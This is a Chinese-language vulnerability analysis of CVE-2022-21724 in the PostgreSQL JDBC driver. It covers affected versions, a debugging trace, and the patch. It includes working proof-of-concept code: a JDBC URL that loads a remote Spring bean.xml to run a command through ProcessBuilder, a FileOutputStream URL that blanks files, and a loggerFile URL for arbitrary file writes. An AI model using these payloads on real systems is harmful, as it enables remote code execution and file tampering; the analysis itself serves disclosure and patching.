<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>JDBC  Java 数据库连接，(Java Database Connectivity)是 Java 语言中用来规范客户端如何访问数据库的应用程序接口，具体讲就是通过 Java 连接广泛数据库，并对表中数据执行增、删、改、查等操作的技术。</p>
<p>　　当程序中 JDBC 连接 URL 可控时，可能会造成安全问题。比较具有代表性的就是 JDBC 反序列化漏洞，是在于 mysql 数据库连接时产生的。</p>
<h2 data-content="1" id="fd668f35ad96d5bb7599ba23c6294597">漏洞简介</h2>
<p>　　在 PostgreSQL 数据库的 jdbc 驱动程序中发现一个安全漏洞。当攻击者控制 jdbc url 或者属性时，使用 PostgreSQL 数据库的系统将受到攻击。 pgjdbc 根据通过 <code>authenticationPluginClassName</code>、<code>sslhostnameverifier</code>、<code>socketFactory</code> 、<code>sslfactory</code>、<code>sslpasswordcallback</code> 连接属性提供类名实例化插件实例。但是，驱动程序在实例化类之前没有验证类是否实现了预期的接口。这可能导致通过任意类加载远程代码执行。</p>
<p>　　影响范围：</p>
<p>　　9.4.1208 &lt;=PgJDBC &lt;42.2.25</p>
<p>　　42.3.0 &lt;=PgJDBC &lt; 42.3.2</p>
<h2 data-content="1" id="f2fa83b8da3cdf7f00794d57d773a46c">漏洞复现</h2>
<p>　　创建 maven 项目，添加依赖</p>
<div class="highlight"><pre><span></span><span class="c">&lt;!-- https://mvnrepository.com/artifact/org.postgresql/postgresql --&gt;</span>
<span class="nt">&lt;dependency&gt;</span>
    <span class="nt">&lt;groupId&gt;</span>org.postgresql<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>postgresql<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>42.3.1<span class="nt">&lt;/version&gt;</span>
<span class="nt">&lt;/dependency&gt;</span>
<span class="c">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context-support --&gt;</span>
<span class="nt">&lt;dependency&gt;</span>
    <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>spring-context-support<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>5.3.23<span class="nt">&lt;/version&gt;</span>
<span class="nt">&lt;/dependency&gt;</span>
</pre></div>
<p>　　编写测试代码</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.sql.Connection</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.SQLException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">cve202221724</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">socketFactoryClass</span> <span class="o">=</span> <span class="s">"org.springframework.context.support.ClassPathXmlApplicationContext"</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">socketFactoryArg</span> <span class="o">=</span> <span class="s">"http://127.0.0.1:8080/bean.xml"</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">jdbcUrl</span> <span class="o">=</span> <span class="s">"jdbc:postgresql://127.0.0.1:5432/test/?socketFactory="</span><span class="o">+</span><span class="n">socketFactoryClass</span><span class="o">+</span> <span class="s">"&amp;socketFactoryArg="</span><span class="o">+</span><span class="n">socketFactoryArg</span><span class="o">;</span>
        <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">jdbcUrl</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>　　bean.xml</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">"http://www.springframework.org/schema/beans"</span>
       <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
       <span class="na">xmlns:p=</span><span class="s">"http://www.springframework.org/schema/p"</span>
       <span class="na">xsi:schemaLocation=</span><span class="s">"http://www.springframework.org/schema/beans</span>
<span class="s">        http://www.springframework.org/schema/beans/spring-beans.xsd"</span><span class="nt">&gt;</span>
<span class="c">&lt;!--    普通方式创建类--&gt;</span>
   <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"exec"</span> <span class="na">class=</span><span class="s">"java.lang.ProcessBuilder"</span> <span class="na">init-method=</span><span class="s">"start"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;constructor-arg&gt;</span>
          <span class="nt">&lt;list&gt;</span>
            <span class="nt">&lt;value&gt;</span>bash<span class="nt">&lt;/value&gt;</span>
            <span class="nt">&lt;value&gt;</span>-c<span class="nt">&lt;/value&gt;</span>
            <span class="nt">&lt;value&gt;</span>calc.exe<span class="nt">&lt;/value&gt;</span>
          <span class="nt">&lt;/list&gt;</span>
        <span class="nt">&lt;/constructor-arg&gt;</span>
    <span class="nt">&lt;/bean&gt;</span>
<span class="nt">&lt;/beans&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107155558-9dcabc94-5e71-1.gif"/></p>
<h2 data-content="1" id="1c359a236e4b1de9b9761deb0c99e740">漏洞分析</h2>
<h3 data-content="1" id="b6d36b9f9c4e7f34de87c41c83adf236">任意代码执行  socketFactory/socketFactoryArg</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160056-4f606954-5e72-1.png"/></p>
<p>　　先将调试后的流程大概画出</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160114-59dd8d94-5e72-1.png"/></p>
<p>　　<code>java.sql.DriverManager#getConnection(java.lang.String)</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160130-632bfd4a-5e72-1.png"/></p>
<p>　　<code>java.sql.DriverManager#getConnection(java.lang.String, java.util.Properties, java.lang.Class&lt;?&gt;)</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160710-2e52d714-5e73-1.png"/></p>
<p>　　利用 <code>org.postgresql.Driver</code> 的 jdbc 驱动去连接数据库</p>
<p>　　<code>org.postgresql.Driver#connect</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160751-46747582-5e73-1.png"/></p>
<p>　　调用 makeConnection 去连接数据库</p>
<p>　　<code>org.postgresql.Driver#makeConnection</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160817-563e814c-5e73-1.png"/></p>
<p>　　<code>org.postgresql.jdbc.PgConnection#PgConnection</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160843-655242ae-5e73-1.png"/></p>
<p>　　<code>org.postgresql.core.ConnectionFactory#openConnection</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160909-74bfd292-5e73-1.png"/></p>
<p>　　<code>org.postgresql.core.v3.ConnectionFactoryImpl#openConnectionImpl</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160930-819a0906-5e73-1.png"/></p>
<p>　　<code>org.postgresql.core.SocketFactoryFactory#getSocketFactory</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160951-8dc99f3e-5e73-1.png"/></p>
<p>　　PGProperty 是枚举类型 其中的 get 方法是判断枚举项的值有没有传入的 properties，如果存在就查找返回，没有就返回默认值<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161011-99cc81e8-5e73-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">SOCKET_FACTORY</span><span class="o">(</span>
      <span class="s">"socketFactory"</span><span class="o">,</span>
      <span class="kc">null</span><span class="o">,</span>
      <span class="s">"Specify a socket factory for socket creation"</span><span class="o">),</span>
  <span class="n">SOCKET_FACTORY_ARG</span><span class="o">(</span>
      <span class="s">"socketFactoryArg"</span><span class="o">,</span>
      <span class="kc">null</span><span class="o">,</span>
      <span class="s">"Argument forwarded to constructor of SocketFactory class."</span><span class="o">),</span>
</pre></div>
<p>　　<code>org.postgresql.util.ObjectFactory#instantiate</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161121-c3c59232-5e73-1.png"/></p>
<p>　　通过 newInstance 来实现对 ctor 类 的创建，同时 args 作为参数。构造方法中有且只有一个  String 参数的类就可以满足条件。</p>
<ul>
<li>org.apache.commons.jxpath.functions.ConstructorFunction</li>
<li>org.apache.commons.jxpath.functions.MethodFunction</li>
<li>java.io.FileOutputStream</li>
</ul>
<p>　　通过利用 CVE-2017-17485 实现 Spring spel 执行任意命令 或者利用 FileOutputStream 将任意文件置空(<code>jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=java.io.FileOutputStream&amp;socketFactoryArg=test.txt</code>)</p>
<h3 data-content="1" id="2bd837ee242bf46fd696b7ef2650e1f0">任意代码执行  sslfactory/sslfactoryarg</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161207-dee442ac-5e73-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161250-f8d81774-5e73-1.gif"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161326-0e54b59e-5e74-1.png"/></p>
<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">init</span><span class="o">&gt;:</span><span class="mi">85</span><span class="o">,</span> <span class="n">ClassPathXmlApplicationContext</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">support</span><span class="o">)</span>
<span class="nl">newInstance0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">45</span><span class="o">,</span> <span class="n">DelegatingConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">423</span><span class="o">,</span> <span class="n">Constructor</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">instantiate:</span><span class="mi">62</span><span class="o">,</span> <span class="n">ObjectFactory</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">getSslSocketFactory:</span><span class="mi">64</span><span class="o">,</span> <span class="n">SocketFactoryFactory</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convert:</span><span class="mi">34</span><span class="o">,</span> <span class="n">MakeSSL</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">.</span><span class="na">ssl</span><span class="o">)</span>
<span class="nl">enableSSL:</span><span class="mi">546</span><span class="o">,</span> <span class="n">ConnectionFactoryImpl</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">v3</span><span class="o">)</span>
<span class="nl">tryConnect:</span><span class="mi">151</span><span class="o">,</span> <span class="n">ConnectionFactoryImpl</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">v3</span><span class="o">)</span>
<span class="nl">openConnectionImpl:</span><span class="mi">215</span><span class="o">,</span> <span class="n">ConnectionFactoryImpl</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">v3</span><span class="o">)</span>
<span class="nl">openConnection:</span><span class="mi">51</span><span class="o">,</span> <span class="n">ConnectionFactory</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="o">&lt;</span><span class="n">init</span><span class="o">&gt;:</span><span class="mi">225</span><span class="o">,</span> <span class="n">PgConnection</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">.</span><span class="na">jdbc</span><span class="o">)</span>
<span class="nl">makeConnection:</span><span class="mi">466</span><span class="o">,</span> <span class="n">Driver</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">)</span>
<span class="nl">connect:</span><span class="mi">265</span><span class="o">,</span> <span class="n">Driver</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">postgresql</span><span class="o">)</span>
<span class="nl">getConnection:</span><span class="mi">664</span><span class="o">,</span> <span class="n">DriverManager</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">sql</span><span class="o">)</span>
<span class="nl">getConnection:</span><span class="mi">270</span><span class="o">,</span> <span class="n">DriverManager</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">sql</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">17</span><span class="o">,</span> <span class="n">cve202221724</span>
</pre></div>
<p>　　<code>org.postgresql.core.v3.ConnectionFactoryImpl#openConnectionImpl</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161357-20a91604-5e74-1.png"/></p>
<p>　　尝试与数据库进行连接</p>
<p>　　<code>org.postgresql.core.v3.ConnectionFactoryImpl#tryConnect</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161427-327b00cc-5e74-1.png"/></p>
<p>　　建立连接后收到请求以 <code>S</code> 开头，进入 org.postgresql.ssl.MakeSSL#convert</p>
<p>　　<code>org.postgresql.core.v3.ConnectionFactoryImpl#enableSSL</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161519-519f483c-5e74-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161548-630d490c-5e74-1.png"/></p>
<p>　　<code>org.postgresql.ssl.MakeSSL#convert</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161620-75f58ad4-5e74-1.png"/></p>
<p>　　<code>org.postgresql.core.SocketFactoryFactory#getSslSocketFactory</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161656-8b52ffec-5e74-1.png"/></p>
<h3 data-content="1" id="dff48d3f533d8b6b477701a0ec6688d9">任意文件写入  loggerLevel/loggerFile</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161723-9b5851da-5e74-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161753-ad66e184-5e74-1.png"/></p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.sql.Connection</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.SQLException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">cve202221724</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">loggerLevel</span> <span class="o">=</span> <span class="s">"debug"</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">loggerFile</span> <span class="o">=</span> <span class="s">"test.txt"</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">shellContent</span><span class="o">=</span><span class="s">"test"</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">jdbcUrl</span> <span class="o">=</span> <span class="s">"jdbc:postgresql://127.0.0.1:5432/test?loggerLevel="</span><span class="o">+</span><span class="n">loggerLevel</span><span class="o">+</span><span class="s">"&amp;loggerFile="</span><span class="o">+</span><span class="n">loggerFile</span><span class="o">+</span> <span class="s">"&amp;"</span><span class="o">+</span><span class="n">shellContent</span><span class="o">;</span>
        <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">jdbcUrl</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161823-bf68dcc0-5e74-1.png"/></p>
<p>　　<code>org.postgresql.Driver#connect</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161845-cbffbce2-5e74-1.png"/></p>
<p>　　<code>org.postgresql.Driver#setupLoggerFromProperties</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161905-d80d8d02-5e74-1.png"/></p>
<p>　　通过 设置扩展参数 <code>LOGGER_FILE</code> 指定日志文件保存位置，没有进行校验，所以可以跨目录的保存文件</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107161924-e3b06134-5e74-1.png"/></p>
<p>　　生成临时文件，之后将日志信息保存到文件中</p>
<p>　　<code>org.postgresql.Driver#connect</code></p>
<p>　　先通过 setupLoggerFromProperties 设定相关的参数 然后再利用 <code>LOGGER.log</code> 保存文件<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107162002-fa193c0c-5e74-1.png"/></p>
<h2 data-content="1" id="dfd3ae2a523bef3676275826c025f9da">漏洞修复</h2>
<p>　　针对代码执行的漏洞而言，要求获取的类名必须是指定类的子类，否则就抛出异常<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160620-102b7f98-5e73-1.png"/></p>
<p>　　对于任意文件写入而言，高版本中移除了对日志文件的设定操作 <code>setupLoggerFromProperties(props);</code><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221107160644-1e42c870-5e73-1.png"/></p>
</div>
</div>